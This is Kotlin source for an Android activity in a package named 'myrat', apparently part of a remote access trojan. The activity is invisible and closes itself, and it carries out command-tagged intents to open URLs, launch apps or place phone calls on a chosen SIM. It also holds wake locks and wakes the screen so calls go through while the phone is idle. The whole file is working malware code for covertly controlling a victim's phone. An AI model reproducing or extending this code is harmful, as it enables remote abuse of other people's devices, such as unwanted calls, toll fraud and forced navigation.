package com.myrat.app

import android.Manifest
import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.telecom.PhoneAccountHandle
import android.telecom.TelecomManager
import android.telephony.SubscriptionManager
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.myrat.app.utils.Logger

class LauncherActivity : AppCompatActivity() {

    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setTheme(android.R.style.Theme_Translucent_NoTitleBar)

        try {
            // Acquire wake lock to ensure calls work even when screen is off
            acquireWakeLock()

            Logger.log("🚀 LauncherActivity started with action: ${intent.action}")

            when (intent.action) {
                "com.myrat.app.ACTION_OPEN_URL" -> handleOpenUrl()
                "com.myrat.app.ACTION_OPEN_APP" -> handleOpenApp()
                "com.myrat.app.ACTION_MAKE_CALL" -> handleMakeCall()
                else -> {
                    Logger.error("❌ Unknown action in LauncherActivity: ${intent.action}")
                }
            }
        } catch (e: Exception) {
            Logger.error("❌ Error in LauncherActivity onCreate", e)
        } finally {
            // Always finish the activity
            finish()
        }
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
            if (powerManager != null) {
                wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "LauncherActivity:CallWake"
                )
                wakeLock?.acquire(30000) // 30 seconds
                Logger.log("✅ Wake lock acquired for LauncherActivity")
            }
        } catch (e: Exception) {
            Logger.error("Failed to acquire wake lock for LauncherActivity", e)
        }
    }

    private fun handleOpenUrl() {
        try {
            val url = intent.getStringExtra("url")
            if (url != null && (url.startsWith("http://") || url.startsWith("https://"))) {
                val urlIntent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                startActivity(urlIntent)
                Logger.log("✅ Launched URL from LauncherActivity: $url")
            } else {
                Logger.error("❌ Invalid URL in LauncherActivity: $url")
            }
        } catch (e: ActivityNotFoundException) {
            Logger.error("❌ Failed to launch URL from LauncherActivity", e)
        } catch (e: Exception) {
            Logger.error("❌ Error handling URL in LauncherActivity", e)
        }
    }

    private fun handleOpenApp() {
        try {
            val packageName = intent.getStringExtra("packageName")
            if (!packageName.isNullOrEmpty()) {
                val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
                if (launchIntent != null) {
                    startActivity(launchIntent)
                    Logger.log("✅ Launched app from LauncherActivity: $packageName")
                } else {
                    Logger.error("❌ App not found in LauncherActivity: $packageName")
                }
            } else {
                Logger.error("❌ Invalid package name in LauncherActivity")
            }
        } catch (e: ActivityNotFoundException) {
            Logger.error("❌ Failed to launch app from LauncherActivity", e)
        } catch (e: Exception) {
            Logger.error("❌ Error handling app launch in LauncherActivity", e)
        }
    }

    private fun handleMakeCall() {
        try {
            val recipient = intent.getStringExtra("recipient")
            val subId = intent.getIntExtra("subId", -1)
            val simSlotIndex = intent.getIntExtra("simSlotIndex", -1)
            val commandId = intent.getStringExtra("commandId")

            Logger.log("📞 LauncherActivity making call: recipient=$recipient, subId=$subId, slot=$simSlotIndex, commandId=$commandId")

            if (recipient.isNullOrEmpty() || subId == -1) {
                Logger.error("❌ Invalid call parameters: recipient=$recipient, subId=$subId")
                return
            }

            // Check required permissions
            val hasCallPhonePermission = ContextCompat.checkSelfPermission(
                this, Manifest.permission.CALL_PHONE
            ) == PackageManager.PERMISSION_GRANTED
            val hasReadPhoneStatePermission = ContextCompat.checkSelfPermission(
                this, Manifest.permission.READ_PHONE_STATE
            ) == PackageManager.PERMISSION_GRANTED

            if (!hasCallPhonePermission || !hasReadPhoneStatePermission) {
                Logger.error("❌ Missing permissions for call: CALL_PHONE=$hasCallPhonePermission, READ_PHONE_STATE=$hasReadPhoneStatePermission")
                return
            }

            // Wake up screen if needed for call
            wakeUpScreen()
            
            // Try call methods in order - ONLY ONE AT A TIME
            var callSuccess = false
            
            // Method 1: Try TelecomManager (Android 6+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !callSuccess) {
                callSuccess = tryTelecomManagerCall(recipient, subId, simSlotIndex)
                if (callSuccess) {
                    Logger.log("✅ Call successful via TelecomManager")
                    return // Exit immediately on success
                }
            }
            
            // Method 2: Try direct Intent.ACTION_CALL (only if TelecomManager failed)
            if (!callSuccess) {
                callSuccess = tryDirectCall(recipient, subId, simSlotIndex)
                if (callSuccess) {
                    Logger.log("✅ Call successful via direct Intent")
                    return // Exit immediately on success
                }
            }
            
            // If we reach here, all methods failed
            if (!callSuccess) {
                Logger.error("❌ All call methods failed in LauncherActivity")
            }

        } catch (e: SecurityException) {
            Logger.error("❌ SecurityException while placing call: ${e.message}", e)
        } catch (e: Exception) {
            Logger.error("❌ Failed to place call in LauncherActivity: ${e.message}", e)
        }
    }

    private fun tryTelecomManagerCall(recipient: String, subId: Int, simSlotIndex: Int): Boolean {
        return try {
            Logger.log("📞 Trying TelecomManager call...")
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val telecomManager = getSystemService(TELECOM_SERVICE) as? TelecomManager
                if (telecomManager == null) {
                    Logger.error("TelecomManager is null")
                    return false
                }
                
                val phoneAccountHandle = getPhoneAccountHandleForSubscription(telecomManager, subId)
                if (phoneAccountHandle != null) {
                    val uri = Uri.parse("tel:$recipient")
                    val extras = Bundle().apply {
                        putParcelable(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, phoneAccountHandle)
                        putInt("android.telephony.extra.SUBSCRIPTION_ID", subId)
                        putInt("com.android.phone.extra.slot", simSlotIndex)
                        putInt("subscription", subId)
                        putBoolean(TelecomManager.EXTRA_START_CALL_WITH_SPEAKERPHONE, false)
                    }
                    
                    telecomManager.placeCall(uri, extras)
                    Logger.log("📞 TelecomManager call placed successfully")
                    return true
                } else {
                    Logger.error("PhoneAccountHandle not found for subId: $subId")
                }
            }
            false
        } catch (e: SecurityException) {
            Logger.error("SecurityException in TelecomManager call", e)
            false
        } catch (e: Exception) {
            Logger.error("Error in TelecomManager call", e)
            false
        }
    }

    private fun tryDirectCall(recipient: String, subId: Int, simSlotIndex: Int): Boolean {
        return try {
            Logger.log("📞 Trying direct Intent call...")
            
            val callIntent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$recipient")).apply {
                putExtra("com.android.phone.force.slot", true)
                putExtra("com.android.phone.extra.slot", simSlotIndex)
                putExtra("android.telephony.extra.SUBSCRIPTION_ID", subId)
                putExtra("subscription", subId)
                putExtra("simSlot", simSlotIndex)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            
            startActivity(callIntent)
            Logger.log("📞 Direct call launched successfully")
            true
        } catch (e: ActivityNotFoundException) {
            Logger.error("Failed to launch direct call", e)
            false
        } catch (e: SecurityException) {
            Logger.error("SecurityException in direct call", e)
            false
        } catch (e: Exception) {
            Logger.error("Error in direct call", e)
            false
        }
    }

    private fun getPhoneAccountHandleForSubscription(telecomManager: TelecomManager, subId: Int): PhoneAccountHandle? {
        return try {
            val phoneAccounts = telecomManager.callCapablePhoneAccounts
            Logger.log("📱 Available phone accounts: ${phoneAccounts.size}")

            // Get SubscriptionManager to verify subscription exists
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
            val activeSubscriptions = subscriptionManager?.activeSubscriptionInfoList
            Logger.log("📱 Active subscriptions: ${activeSubscriptions?.size ?: 0}")

            phoneAccounts.find { account ->
                try {
                    val phoneAccount = telecomManager.getPhoneAccount(account)
                    val accountSubId = phoneAccount?.extras?.getInt("android.telephony.extra.SUBSCRIPTION_ID", -1) ?: -1
                    
                    // Verify the subscriptionId exists in active subscriptions
                    val isValidSubscription = activeSubscriptions?.any { it.subscriptionId == accountSubId } ?: false
                    Logger.log("🔍 Comparing accountSubId: $accountSubId with target subId: $subId, isValid: $isValidSubscription")
                    
                    accountSubId == subId && isValidSubscription
                } catch (e: Exception) {
                    Logger.error("Error checking phone account: $account", e)
                    false
                }
            }
        } catch (e: SecurityException) {
            Logger.error("SecurityException while getting PhoneAccountHandle", e)
            null
        } catch (e: Exception) {
            Logger.error("Failed to get PhoneAccountHandle for subId: $subId", e)
            null
        }
    }

    private fun wakeUpScreen() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
            if (powerManager != null && !powerManager.isInteractive) {
                val screenWakeLock = powerManager.newWakeLock(
                    PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                    "LauncherActivity:ScreenWake"
                )
                screenWakeLock.acquire(10000) // 10 seconds
                screenWakeLock.release()
                Logger.log("💡 Screen woken up for call")
            }
        } catch (e: Exception) {
            Logger.error("Failed to wake up screen for call", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            // Release wake lock
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                    Logger.log("✅ Released wake lock in LauncherActivity")
                }
            }
        } catch (e: Exception) {
            Logger.error("Error releasing wake lock in LauncherActivity", e)
        }
    }
}